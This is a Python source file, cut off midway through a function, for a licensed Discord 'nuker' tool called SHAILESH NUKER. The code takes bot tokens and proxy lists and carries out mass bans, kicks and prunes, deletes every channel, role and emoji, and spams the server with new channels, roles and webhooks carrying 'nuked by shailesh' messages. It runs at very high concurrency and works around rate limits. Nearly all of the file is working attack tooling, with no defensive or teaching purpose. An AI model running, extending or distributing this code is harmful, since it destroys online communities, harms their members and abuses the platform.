import asyncio
import aiohttp
import discord
from discord.ext import commands
from itertools import cycle
import random
import json
import os
import webbrowser
import base64
from datetime import datetime, timedelta
import time
import pyperclip

import httpx
import sys
import logging
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from keyauth import api

# --- Suppress Discord Internal Noise ---
logging.getLogger('discord').setLevel(logging.CRITICAL)
logging.getLogger('discord.http').setLevel(logging.CRITICAL)


VERSION = '2.1.4'

__mode__ = None

WIZZLER_START = (0, 255, 255)
WIZZLER_END = (0, 128, 255)
DEADLIZER_START = (128, 0, 255)
DEADLIZER_END = (0, 255, 255)
GREEN_START = (0, 255, 128)
GREEN_END = (0, 255, 255)
RED_START = (255, 0, 128)
RED_END = (128, 0, 255)
PINK_START = (255, 0, 255)
PINK_END = (128, 0, 255)

def gradient_text(text, start_color, end_color, bold=True):
    def rgb_to_256(r, g, b):
        r = round(r / 255 * 5)
        g = round(g / 255 * 5)
        b = round(b / 255 * 5)
        return 16 + (36 * r) + (6 * g) + b

    result = "\033[1m" if bold else ""
    length = len(text)
    for i, char in enumerate(text):
        ratio = i / max(length - 1, 1)
        r = int(start_color[0] + (end_color[0] - start_color[0]) * ratio)
        g = int(start_color[1] + (end_color[1] - start_color[1]) * ratio)
        b = int(start_color[2] + (end_color[2] - start_color[2]) * ratio)
        color_code = rgb_to_256(r, g, b)
        result += f"\033[38;5;{color_code}m{char}"
    result += "\033[0m"
    return result

def load_tokens():
    """Loads tokens from tokens.txt"""
    try:
        with open("tokens.txt", "r") as f:
            tokens = [line.strip() for line in f if line.strip()]
        if not tokens:
            print(format_log_message("ERROR", "tokens.txt is empty.", 50))
            return []
        print(format_log_message("SUCCESS", f"Loaded {len(tokens)} tokens.", 50))
        return tokens
    except FileNotFoundError:
        print(format_log_message("ERROR", "tokens.txt not found.", 50))
        return []

def get_mode_colors():
    """Get colors based on current mode"""
    if __mode__ == "deadlizer":
        return DEADLIZER_START, DEADLIZER_END
    else:
        return WIZZLER_START, WIZZLER_END

def format_log_message(status, message, padding=35):
    timestamp = f"[{datetime.now():%Y-%m-%d %H:%M:%S}]"
    mode_start, mode_end = get_mode_colors()
    if status == "SUCCESS":
        full_message = f"{timestamp} (+) SUCCESS   SHAILESH    {message:<{padding}}"
        return gradient_text(full_message, GREEN_START, GREEN_END, bold=True)
    elif status == "ERROR":
        full_message = f"{timestamp} (+) ERROR   SHAILESH    {message:<{padding}}"
        return gradient_text(full_message, RED_START, RED_END, bold=True)
    else:
        full_message = f"{timestamp} (+) INFO   SHAILESH    {message:<{padding}} │"
        return gradient_text(full_message, mode_start, mode_end, bold=True)

async def add_jitter_delay(min_delay=0.0, max_delay=0.0):
    pass

def switch_to_deadlizer():
    """Switch to Deadlizer mode"""
    global __mode__, __max_concurrent__
    __mode__ = "deadlizer"
    __max_concurrent__ = 500000
    os.system("cls") if os.name == "nt" else os.system("clear")
    print(format_log_message("SUCCESS", "Switched to Deadlizer Mode - Concurrent: 2000", 40))
    print(format_log_message("INFO", "TIME TO DESTROY", 40))
    return True

def switch_to_wizzler():
    """Switch to Wizzler mode"""
    global __mode__
    __mode__ = "wizzler"
    os.system("cls") if os.name == "nt" else os.system("clear")
    print(format_log_message("SUCCESS", "Switched to Wizzler Mode", 40))
    print(format_log_message("INFO", "wizzlers op", 40))
    return True

__client__ = commands.Bot(command_prefix="+", help_command=None)

__config__ = None
__loaded_configs__ = {}  
__current_config_name__ = None  
__config_index__ = 0  
config_folder = "configs"

def switch_config(config_name):
    """Switch to a different loaded config"""
    global __config__, __current_config_name__, token, __max_concurrent__
    
    if config_name not in __loaded_configs__:
        print(format_log_message("ERROR", f"Config '{config_name}' not found!", 47))
        return False
    
    __current_config_name__ = config_name
    __config__ = __loaded_configs__[config_name].copy()
    token = __config__["token"]
    __max_concurrent__ = __config__.get("max_concurrent", 70)
    
    if os.name == "nt":
        os.system(f"title Nuker - Max Concurrent: {__max_concurrent__} - Config: {__current_config_name__}")
    
    return True

def load_multiple_configs():
    """Load multiple config files from the configs folder"""
    global __loaded_configs__, __current_config_name__, __config__, token, __max_concurrent__
    
    os.system("cls") if os.name == "nt" else os.system("clear")
    
    if not os.path.exists(config_folder):
        print(format_log_message("ERROR", "'configs' folder not found.", 50))
        os._exit(1)

    config_files = [f for f in os.listdir(config_folder) if f.endswith(".json")]
    if not config_files:
        print(format_log_message("ERROR", "No JSON files found in 'configs' folder.", 50))
        os._exit(1)
    while True:
        mode_start, mode_end = get_mode_colors()
        print(format_log_message("INFO", "Available Configs:", 50))
        print(gradient_text("╭" + "─" * 80 + "╮", mode_start, mode_end, bold=True))
        for i, config_file in enumerate(config_files, 1):
            print(gradient_text(f"│ {i:<2} │ {config_file:<73} │", mode_start, mode_end, bold=True))
        print(gradient_text("╰" + "─" * 80 + "╯", mode_start, mode_end, bold=True))
        print(format_log_message("INFO", "Enter numbers (e.g., 1,2), ranges (1-3), filenames, or 'all'", 30))

        choice_input = input(format_log_message("INFO", "Choose config(s) to load", 50)).strip()
        if not choice_input:
            print(format_log_message("ERROR", "No input provided. Please enter config numbers or 'all'.", 45))
            continue

        choice_lower = choice_input.lower()
        indices = []
        invalid_tokens = []

        if choice_lower == 'all':
            indices = list(range(len(config_files)))
        else:
            tokens = [t.strip() for t in choice_input.split(',') if t.strip()]
            for tok in tokens:
                if '-' in tok and all(p.strip().isdigit() for p in tok.split('-', 1)):
                    try:
                        a_str, b_str = tok.split('-', 1)
                        a = int(a_str.strip()) - 1
                        b = int(b_str.strip()) - 1
                        if a <= b:
                            for idx in range(a, b + 1):
                                if 0 <= idx < len(config_files):
                                    indices.append(idx)
                                else:
                                    invalid_tokens.append(str(idx + 1))
                        else:
                            invalid_tokens.append(tok)
                    except Exception:
                        invalid_tokens.append(tok)
                elif tok.isdigit():
                    idx = int(tok) - 1
                    if 0 <= idx < len(config_files):
                        indices.append(idx)
                    else:
                        invalid_tokens.append(tok)
                else:
                    if tok in config_files:
                        indices.append(config_files.index(tok))
                    else:
                        invalid_tokens.append(tok)

        if invalid_tokens:
            print(format_log_message("ERROR", f"Invalid selections: {', '.join(invalid_tokens)}. Please try again.", 60))
            continue

        seen = set()
        final_indices = []
        for i in indices:
            if i not in seen and 0 <= i < len(config_files):
                final_indices.append(i)
                seen.add(i)

        if not final_indices:
            print(format_log_message("ERROR", "No valid configs selected. Please try again.", 50))
            continue

        for idx in final_indices:
            config_path = os.path.join(config_folder, config_files[idx])
            try:
                loaded_config = json.load(open(config_path, "r", encoding="utf-8"))
                __loaded_configs__[config_files[idx]] = loaded_config
                print(format_log_message("SUCCESS", f"Loaded {gradient_text(config_files[idx], GREEN_START, GREEN_END, bold=True)}", 52))
            except json.JSONDecodeError as e:
                print(format_log_message("ERROR", f"Invalid JSON in {config_files[idx]}: {str(e)}", 30))
            except Exception as e:
                print(format_log_message("ERROR", f"Error loading {config_files[idx]}: {str(e)}", 35))

        if not __loaded_configs__:
            print(format_log_message("ERROR", "No valid configs loaded! Please correct files and try again.", 43))
            continue

        __current_config_name__ = list(__loaded_configs__.keys())[0]
        __config__ = __loaded_configs__[__current_config_name__].copy()
        token = __config__["token"]
        __max_concurrent__ = __config__.get("max_concurrent", 50)
        print(format_log_message("SUCCESS", f"Active config: {gradient_text(__current_config_name__, GREEN_START, GREEN_END, bold=True)}", 45))
        break


banner = r"""
 █████████  █████   █████   █████████   █████ █████       ██████████  █████████  █████   █████
 ███▒▒▒▒▒███▒▒███   ▒▒███   ███▒▒▒▒▒███ ▒▒███ ▒▒███       ▒▒███▒▒▒▒▒█ ███▒▒▒▒▒███▒▒███   ▒▒███ 
▒███    ▒▒▒  ▒███    ▒███  ▒███    ▒███  ▒███  ▒███        ▒███  █ ▒ ▒███    ▒▒▒  ▒███    ▒███ 
▒▒█████████  ▒███████████  ▒███████████  ▒███  ▒███        ▒██████   ▒▒█████████  ▒███████████ 
 ▒▒▒▒▒▒▒▒███ ▒███▒▒▒▒▒███  ▒███▒▒▒▒▒███  ▒███  ▒███        ▒███▒▒█    ▒▒▒▒▒▒▒▒███ ▒███▒▒▒▒▒███ 
 ███    ▒███ ▒███    ▒███  ▒███    ▒███  ▒███  ▒███      █ ▒███ ▒   █ ███    ▒███ ▒███    ▒███ 
▒▒█████████  █████   █████ █████   █████ █████ ███████████ ██████████▒▒█████████  █████   █████
 ▒▒▒▒▒▒▒▒▒  ▒▒▒▒▒   ▒▒▒▒▒ ▒▒▒▒▒   ▒▒▒▒▒ ▒▒▒▒▒ ▒▒▒▒▒▒▒▒▒▒▒ ▒▒▒▒▒▒▒▒▒▒  ▒▒▒▒▒▒▒▒▒  ▒▒▒▒▒   ▒▒▒▒▒ 
"""

def get_checksum():
    import hashlib
    md5_hash = hashlib.md5()
    with open(sys.argv[0], "rb") as f:
        for byte_block in iter(lambda: f.read(4096), b""):
            md5_hash.update(byte_block)
    return md5_hash.hexdigest()

app_name = "nuker"; owner_id = "iKBwcm0Yhu"; version = "1.0"
_enc = "26c476a411f2746a2ac4ed5e2ca40482f9b20439bd578de8ce71d476c46fc9ec"
try:
    keyauthapp = api(app_name, owner_id, _enc, version, get_checksum())
except Exception as e:
    print(f"KeyAuth init error: {e}")
    os._exit(0)

DEFAULT_CONFIG_JSON = {
    "proxy": False,
    "autonuke": {
        "channel_count": 50,
        "role_count": 50,
        "spam_count": 10
    },
    "tokens": []
}

shailesh_config_path = "config.json"

if not os.path.exists(shailesh_config_path):
    with open(shailesh_config_path, 'w', encoding='utf-8') as f: json.dump(DEFAULT_CONFIG_JSON, f, indent=4)

shailesh_config = json.load(open(shailesh_config_path, 'r', encoding='utf-8'))

def save_shailesh_config():
    with open(shailesh_config_path, 'w', encoding='utf-8') as f:
        json.dump(shailesh_config, f, indent=4)

def token_manager():
    global token
    if 'tokens' not in shailesh_config:
        shailesh_config['tokens'] = []
        save_shailesh_config()
        
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Colorate.Vertical(Colors.cyan_to_blue, Center.XCenter(banner)))
        print(f"\n" + " " * 30 + "TOKEN VAULT")
        print(" " * 20 + "─" * 60)
        
        saved_tokens = shailesh_config.get('tokens', [])
        for i, entry in enumerate(saved_tokens, 1):
            t_mask = f"{entry['token'][:15]}...{entry['token'][-5:]}"
            print(f" " * 20 + f"[{i}] {entry['name']} | \033[90m{t_mask}\033[0m")
        
        print(" " * 20 + "─" * 60)
        print(f" " * 20 + f"[{len(saved_tokens)+1}] Add New Token")
        print(f" " * 20 + f"[{len(saved_tokens)+2}] Delete Token")
        print(f" " * 20 + f"[0] Use Custom Token (Not Saved)")
        
        choice = input(f"\n\x1b[90m(\x1b[0mSHAILESH\x1b[90m)\x1b[0m Selection: ").strip()
        
        if choice == '0':
            token = input(f"\x1b[90m(\x1b[0mSHAILESH\x1b[90m)\x1b[0m Enter Token: ").strip()
            return token
        
        try:
            choice_int = int(choice)
            if 1 <= choice_int <= len(saved_tokens):
                return saved_tokens[choice_int-1]['token']
            elif choice_int == len(saved_tokens) + 1:
                new_name = input(f"\x1b[90m(\x1b[0mSHAILESH\x1b[90m)\x1b[0m Enter Name: ").strip()
                new_token = input(f"\x1b[90m(\x1b[0mSHAILESH\x1b[90m)\x1b[0m Enter Token: ").strip()
                if new_name and new_token:
                    shailesh_config['tokens'].append({'name': new_name, 'token': new_token})
                    save_shailesh_config()
                    print(f"\n\033[32m[+] Token '{new_name}' saved successfully!\033[0m")
                    time.sleep(1.5)
            elif choice_int == len(saved_tokens) + 2:
                idx = int(input(f"\x1b[90m(\x1b[0mSHAILESH\x1b[90m)\x1b[0m Index to Delete: ").strip())
                if 1 <= idx <= len(saved_tokens):
                    removed = shailesh_config['tokens'].pop(idx-1)
                    save_shailesh_config()
                    print(f"\n\033[32m[+] Removed '{removed['name']}' from vault!\033[0m")
                    time.sleep(1.5)
        except Exception as e:
            time.sleep(1.5)


os.system('cls' if os.name == 'nt' else 'clear')
System.Title("SHAILESH NUKER")
print(Colorate.Vertical(Colors.cyan_to_blue, Center.XCenter(banner)))
key = input(f"\n\x1b[90m(\x1b[0mSHAILESH\x1b[90m)\x1b[0m Enter License Key: ").strip()
if not key: os._exit(0)
try:
    keyauthapp.license(key)
except Exception as e:
    print(f"KeyAuth Login Failed: {e}")
    os._exit(0)

token = token_manager()

# Set default __config__ for Wizzler
__max_concurrent__ = 500000
__config__ = {
    "token": token,
    "max_concurrent": __max_concurrent__,
    "proxy": True,
    "nuke": {
        "channel_names": ["nuked by shailesh", "shailesh nuker on top", "system obliteration"],
        "roles_name": ["shailesh owns you", "fucked by shailesh", "nuked"],
        "messages_content": ["@everyone @here Nuked by SHAILESH NUKER v5.0", "@everyone @here System Obliterated by SHAILESH"],
        "delete_all_channels": True
    },
    "nuke_all": {
        "ban_members": True,
        "delete_channels": True,
        "delete_roles": True,
        "delete_emojis": True,
        "change_guild_name": True,
        "create_channels": True,
        "create_roles": True,
        "spam_webhooks": True,
        "prune_members": True
    },
    "operations": {
        "ouath2": "https://discord.com/api/oauth2/authorize?client_id=REPLACE_ME&permissions=8&scope=bot",
        "ban_reason": "Nuked by Shailesh",
        "nick_users_to": "Nuked by Shailesh",
        "dm_message": "@everyone Shailesh Nuker v5.0 Destroyed This Server!",
        "spam_message": "@everyone @here Nuked by Shailesh",
        "guild_name": "Nuked By Shailesh",
        "guild_icon": "",
        "channel_type": 0,
        "enable_auto_admin": True,            
        "webhooks": {
            "name": "Shailesh Nuker",
            "avatar_url": "",
            "messages": [
                "@everyone @here Nuked by SHAILESH NUKER v5.0",
                "@everyone @here System Obliterated by SHAILESH"
            ]
        },
        "emoji_rename_to": "Shailesh",
        "mass_report_count":10
    }
}
__current_config_name__ = "shailesh_vault"
__mode__ = "wizzler"
__loaded_configs__ = {__current_config_name__: __config__}

os.system("cls") if os.name == "nt" else os.system("clear")

console_width = 140

class shakti:
    def __init__(self, guildid, client):
        self.guildid = guildid
        self.client = client
        self.guild = self.client.get_guild(int(guildid))
        self.guild_name = self.guild.name if self.guild else "Unknown Guild"
        self.has_proxies = False
        self.proxy_count = 0
        try:
            with open("proxies.txt", "r") as f:
                proxy_list = f.read().splitlines()
            if not proxy_list:
                print(format_log_message("ERROR", "proxies.txt is empty. Disabling proxies.", 28))
            else:
                valid_proxies = []
                for proxy in proxy_list:
                    proxy = proxy.strip()
                    if proxy and ":" in proxy:
                        host, port = proxy.rsplit(":", 1)
                        if port.isdigit():
                            valid_proxies.append(proxy)
                        else:
                            print(format_log_message("ERROR", f"Invalid proxy port in '{gradient_text(proxy, PINK_START, PINK_END, bold=True)}'. Skipping.", 19))
                    else:
                        print(format_log_message("ERROR", f"Invalid proxy format: '{gradient_text(proxy, PINK_START, PINK_END, bold=True)}'. Skipping.", 16))
                if not valid_proxies:
                    print(format_log_message("ERROR", "No valid proxies found. Disabling proxies.", 23))
                else:
                    self.proxy_cycle = cycle(valid_proxies)
                    self.has_proxies = True
                    self.proxy_count = len(valid_proxies)
                    print(format_log_message("SUCCESS", f"Loaded {gradient_text(str(len(valid_proxies)), GREEN_START, GREEN_END, bold=True)} valid proxies for rotation.", 17))
        except FileNotFoundError:
            print(format_log_message("ERROR", "proxies.txt not found. Disabling proxies.", 24))
        except Exception as e:
            print(format_log_message("ERROR", f"Error reading proxies: {str(e)}", 15))

        self.version = cycle(['v10'])
        self.banned = []
        self.kicked = []
        self.channels = []
        self.roles = []
        self.emojis = []
        self.messages = []
        self.semaphore = asyncio.Semaphore(__max_concurrent__)
        self.session = None 

        self.whitelist_file = "configs/whitelist.txt"
        self.whitelist = self._load_whitelist()
        self.external_config = self._load_external_config()
        print(format_log_message("SUCCESS", f"Loaded {gradient_text(str(len(self.whitelist)), GREEN_START, GREEN_END, bold=True)} whitelisted members.", 22))

    def _load_external_config(self):
        ext_config = {}
        if os.path.exists("config.txt"):
            try:
                with open("config.txt", "r", encoding="utf-8") as f:
                    lines = f.readlines()
                
                content_mode = False
                message_lines = []
                
                for line in lines:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    
                    if line.lower().startswith("message_content:"):
                        content_mode = True
                        continue
                    
                    if content_mode:
                        message_lines.append(line)
                        continue
                    
                    if ":" in line:
                        key, value = line.split(":", 1)
                        key = key.strip().lower()
                        value = value.strip()
                        
                        if value.lower() == "true":
                            value = True
                        elif value.lower() == "false":
                            value = False
                        
                        ext_config[key] = value
                
                if message_lines:
                    ext_config["message_content"] = "\n".join(message_lines)
                
                print(format_log_message("SUCCESS", "Loaded Auto Nuke settings from config.txt", 40))
            except Exception as e:
                print(format_log_message("ERROR", f"Failed to load config.txt | {e}", 40))
        return ext_config

    def _load_whitelist(self):
        try:
            if not os.path.exists(self.whitelist_file):
                return set()
            with open(self.whitelist_file, "r") as f:
                return set(line.strip() for line in f if line.strip() and line.strip().isdigit())
        except Exception:
            return set()

    def _save_whitelist(self):
        try:
            os.makedirs(os.path.dirname(self.whitelist_file) or 'configs', exist_ok=True)
            with open(self.whitelist_file, "w") as f:
                f.write('\n'.join(sorted(list(self.whitelist))))
        except Exception as e:
            print(format_log_message("ERROR", f"Failed to save whitelist: {e}", 36))

    async def add_to_whitelist(self, user_id):
        user_id = user_id.strip()
        if not user_id.isdigit():
            print(format_log_message("ERROR", f"Invalid User ID: {user_id}", 40))
            return False
        if user_id in self.whitelist:
            print(format_log_message("INFO", f"User {user_id} already whitelisted", 40))
            return False
        self.whitelist.add(user_id)
        self._save_whitelist()
        print(format_log_message("SUCCESS", f"Whitelisted User ID: {user_id}", 40))
        return True

    async def remove_from_whitelist(self, user_id):
        user_id = user_id.strip()
        if user_id in self.whitelist:
            self.whitelist.remove(user_id)
            self._save_whitelist()
            print(format_log_message("SUCCESS", f"Removed User ID: {user_id} from whitelist", 35))
            return True
        print(format_log_message("ERROR", f"User {user_id} not found in whitelist", 40))
        return False

    async def async_input(self, prompt: str):
        """Async input with Ctrl+C to close"""
        try:
            user_input = await self.client.loop.run_in_executor(None, lambda: input(prompt))
            return user_input
        except KeyboardInterrupt:
            os.system("cls") if os.name == "nt" else os.system("clear")
            print(format_log_message("INFO", "Closing Nuker... Goodbye!", 40))
            await asyncio.sleep(0.5)
            exit(0)

    async def _get_session(self):
        """Creates and returns a persistent aiohttp.ClientSession."""
        if self.session is None or self.session.closed:
            self.session = aiohttp.ClientSession(
                connector=aiohttp.TCPConnector(limit=1000, ssl=False),
                timeout=aiohttp.ClientTimeout(total=10)
            )
        return self.session

    def _get_proxy(self):
        """Returns a proxy URL for the next request, or None."""
        if __config__.get("proxy") and self.has_proxies:
            proxy_host = next(self.proxy_cycle)
            return f"http://{proxy_host}"
        return None

    async def execute_ban(self, member: str, token: str):
        if member in self.whitelist:
            print(format_log_message("INFO", f"Skipping whitelisted member {member} (Ban)", 41))
            return True

        async with self.semaphore:
            while True:
                ban_reason = __config__.get("operations", {}).get("ban_reason", "Nuked by Wizzlers")
                payload = {"delete_message_days": random.randint(0, 7), "audit_log_reason": ban_reason}
                try:
                    session = await self._get_session()
                    async with session.put(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/bans/{member}",
                        headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                    ) as response:
                        if response.status in [200, 201, 204]:
                            print(format_log_message("SUCCESS", f"Banned {member}", 52))
                            self.banned.append(member)
                            return True
                        elif response.status == 429:
                            try:
                                retry_after = (await response.json()).get('retry_after', 1.0)
                            except:
                                retry_after = 1.0
                            wait_time = max(retry_after, 1.0)
                            print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                            await asyncio.sleep(wait_time)
                            continue
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for {member}", 41))
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        elif "Max number of bans" in await response.text():
                            print(format_log_message("ERROR", "Max bans exceeded", 47))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to ban {member}", 46))
                            return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to ban {member} | {e}", 46))
                    return False

    async def execute_kick(self, member: str, token: str):
        if member in self.whitelist:
            print(format_log_message("INFO", f"Skipping whitelisted member {member} (Kick)", 41))
            return True

        async with self.semaphore:
            while True:
                try:
                    session = await self._get_session()
                    async with session.delete(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{member}",
                        headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                    ) as response:
                        if response.status in [200, 201, 204]:
                            print(format_log_message("SUCCESS", f"Kicked {member}", 52))
                            self.kicked.append(member)
                            return True
                        elif response.status == 429:
                            try:
                                retry_after = (await response.json()).get('retry_after', 1.0)
                            except:
                                retry_after = 1.0
                            wait_time = max(retry_after, 1.0)
                            print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                            await asyncio.sleep(wait_time)
                            continue
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for {member}", 41))
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to kick {member}", 46))
                            return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to kick {member} | {e}", 46))
                    return False

    async def execute_prune(self, days: int, token: str):
        async with self.semaphore:
            while True:
                try:
                    session = await self._get_session()
                    payload = {"days": days}
                    async with session.post(
                        f"https://discord.com/api/v10/guilds/{self.guildid}/prune",
                        headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                        ) as response:
                            if response.status == 200:
                                pruned = (await response.json()).get('pruned', 0)
                                print(format_log_message("SUCCESS", f"Pruned {pruned} members", 43))
                                return pruned
                            elif response.status == 429:
                                try:
                                    retry_after = (await response.json()).get('retry_after', 1.0)
                                except:
                                    retry_after = 1.0
                                wait_time = max(retry_after, 1.0)
                                print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                                await asyncio.sleep(wait_time)
                                continue
                            elif "Missing Permissions" in await response.text():
                                print(format_log_message("ERROR", "Missing Permissions for pruning", 35))
                                return 0
                            elif "Max number of prune" in await response.text():
                                print(format_log_message("ERROR", "Max prune reached", 46))
                                return 0
                            elif "You are being blocked" in await response.text():
                                print(format_log_message("ERROR", "Blocked from Discord API", 40))
                                return 0
                            else:
                                print(format_log_message("ERROR", "Failed to prune members", 41))
                                return 0
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to prune members | {e}", 41))
                    return 0

    async def execute_crechannels(self, channelsname: str, type_: int, token: str):
        async with self.semaphore:
            while True:
                payload = {"type": type_, "name": channelsname.replace(" ", "-"), "permission_overwrites": []}
                try:
                    session = await self._get_session()
                    async with session.post(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/channels",
                        headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                    ) as response:
                        if response.status == 201:
                            channel_id = (await response.json())['id']
                            print(format_log_message("SUCCESS", f"Created channel ID {channel_id}", 42))
                            self.channels.append(1)
                            return True
                        elif response.status == 429:
                            try:
                                retry_after = (await response.json()).get('retry_after', 1.0)
                            except:
                                retry_after = 2.0
                            wait_time = max(retry_after, 1.0)
                            print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                            await asyncio.sleep(wait_time)
                            continue
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for #{payload['name']}", 35))
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to create #{payload['name']}", 40))
                            return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to create #{payload['name']} | {e}", 40))
                    return False

    async def execute_creroles(self, rolesname: str, token: str):
        async with self.semaphore:
            while True:
                colors = random.choice([0x0000FF, 0xFFFFFF, 0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0x00FFFF, 0xFF00FF, 0xC0C0C0, 0x808080, 0x800000, 0x808000, 0x008000, 0x800080, 0x008080, 0x000080])
                payload = {"name": rolesname, "color": colors}
                try:
                    session = await self._get_session()
                    async with session.post(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/roles",
                        headers={"Authorization": f"Bot {token}"}, json=payload, proxy=self._get_proxy()
                    ) as response:
                        if response.status == 200:
                            role_id = (await response.json())['id']
                            print(format_log_message("SUCCESS", f"Created role ID {role_id}", 45))
                            self.roles.append(1)
                            return True
                        elif response.status == 429:
                            try:
                                retry_after = (await response.json()).get('retry_after', 1.0)
                            except:
                                retry_after = 2.0
                            wait_time = max(retry_after, 1.0)
                            print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                            await asyncio.sleep(wait_time)
                            continue
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for @{rolesname}", 35))
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to create @{rolesname}", 40))
                            return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to create @{rolesname} | {e}", 40))
                    return False

    async def execute_delchannels(self, channel: str, token: str):
        async with self.semaphore:
            while True:
                try:
                    session = await self._get_session()
                    async with session.delete(
                        f"https://discord.com/api/{next(self.version)}/channels/{channel}",
                        headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                    ) as response:
                        if response.status == 200:
                            print(format_log_message("SUCCESS", f"Deleted channel {channel}", 42))
                            self.channels.append(channel)
                            return True
                        elif response.status == 429:
                            try:
                                retry_after = (await response.json()).get('retry_after', 1.0)
                            except:
                                retry_after = 1.0
                            wait_time = max(retry_after, 1.0)
                            print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                            await asyncio.sleep(wait_time)
                            continue
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for {channel}", 35))
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to delete {channel}", 44))
                            return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to delete {channel} | {e}", 44))
                    return False

    async def execute_delroles(self, role: str, token: str):
        async with self.semaphore:
            while True:
                try:
                    session = await self._get_session()
                    async with session.delete(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/roles/{role}",
                        headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                    ) as response:
                        if response.status == 204:
                            print(format_log_message("SUCCESS", f"Deleted role {role}", 45))
                            self.roles.append(role)
                            return True
                        elif response.status == 429:
                            try:
                                retry_after = (await response.json()).get('retry_after', 1.0)
                            except:
                                retry_after = 2.0
                            wait_time = max(retry_after, 1.0)
                            print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                            await asyncio.sleep(wait_time)
                            continue
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for role {role}", 35))
                            return False
                        else:
                            return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to delete role {role} | {e}", 40))
                    return False

    async def execute_delemojis(self, emoji: str, token: str):
        async with self.semaphore:
            while True:
                try:
                    session = await self._get_session()
                    async with session.delete(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/emojis/{emoji}",
                        headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()
                    ) as response:
                        if response.status == 204:
                            print(format_log_message("SUCCESS", f"Deleted emoji {emoji}", 45))
                            self.emojis.append(emoji)
                            return True
                        elif response.status == 429:
                            try:
                                retry_after = (await response.json()).get('retry_after', 1.0)
                            except:
                                retry_after = 1.0
                            wait_time = max(retry_after, 1.0)
                            print(format_log_message("INFO", f"Rate limited. Retrying in {wait_time}s", 40))
                            await asyncio.sleep(wait_time)
                            continue
                        elif "Missing Permissions" in await response.text():
                            print(format_log_message("ERROR", f"Missing Permissions for {emoji}", 35))
                            return False
                        elif "You are being blocked" in await response.text():
                            print(format_log_message("ERROR", "Blocked from Discord API", 40))
                            return False
                        else:
                            print(format_log_message("ERROR", f"Failed to delete {emoji}", 44))
                            return False
                except Exception as e:
                    print(format_log_message("ERROR", f"Failed to delete {emoji} | {e}", 44))
                    return False

    async def execute_check_admin(self, token: str):
        """Checks if the bot has Administrator or other elevated permissions"""
        print(format_log_message("INFO", "Checking Bot Permissions...", 40))
        try:
            guild = self.client.get_guild(int(self.guildid))
            if not guild:
                # Fallback if cache is empty
                session = await self._get_session()
                async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}",
                                     headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                    if resp.status == 200:
                        guild_data = await resp.json()
                        self.guild_name = guild_data.get('name', 'Unknown')
                        # We still need member object for perms
                    else:
                        print(format_log_message("ERROR", "Could not fetch guild data", 40))
                        return

            me = guild.me if guild else None
            if not me:
                # Fallback for member data
                session = await self._get_session()
                async with session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/members/{self.client.user.id}",
                                     headers={"Authorization": f"Bot {token}"}, proxy=self._get_proxy()) as resp:
                    if resp.status == 200:
                        member_data = await resp.json()
                        # This is harder to check perms from raw data without full perm logic, 
                        # but we can check if it's there.
                        # For now, let's assume the client cache works if bot is ready.
                        pass
            
            if me:
                perms = me.guild_permissions
                if perms.administrator:
                    print(format_log_message("SUCCESS", "Status: ADMINISTRATOR (FULL ACCESS)", 40))
                else:
                    print(format_log_message("ERROR", "Status: NO ADMINISTRATOR PERMISSION", 40))
                    
                    elevated = []
